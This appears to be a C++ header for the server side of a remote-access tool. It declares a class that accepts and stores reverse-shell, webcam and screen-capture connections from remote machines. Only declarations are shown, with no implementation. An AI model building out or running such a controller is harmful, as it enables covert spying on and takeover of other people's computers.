#pragma once
#include <map>
#include <thread>
#include <iostream>
#include <stdexcept>
#include <winsock2.h> // or <sys/socket.h> and <netinet/in.h> for Linux
#include <ws2tcpip.h> // Only for Windows
#include "pch.h"

#pragma comment(lib, "Ws2_32.lib") // Only for Windows

class Communication {
private:
    map<unsigned int, tuple<SOCKET, string>> _rev_shells;
    map<unsigned int, tuple<SOCKET, string>> _cameras;
    map<unsigned int, tuple<SOCKET, string>> _screens;

    short _revshell_port;
    short _camera_port;
    short _screen_port;

public:
    Communication(short revshell_port, short camera_port, short screen_port);
    ~Communication();
    SOCKET createServerSocket(short port);

    void acceptClients();
    void acceptCamera();
    void acceptShell();
    void acceptScreens();

    string getIP(SOCKET socket);

    map<unsigned int, tuple<SOCKET, string>> getRevShells();
    map<unsigned int, tuple<SOCKET, string>> getCameras();
    map<unsigned int, tuple<SOCKET, string>> getScreens();
};
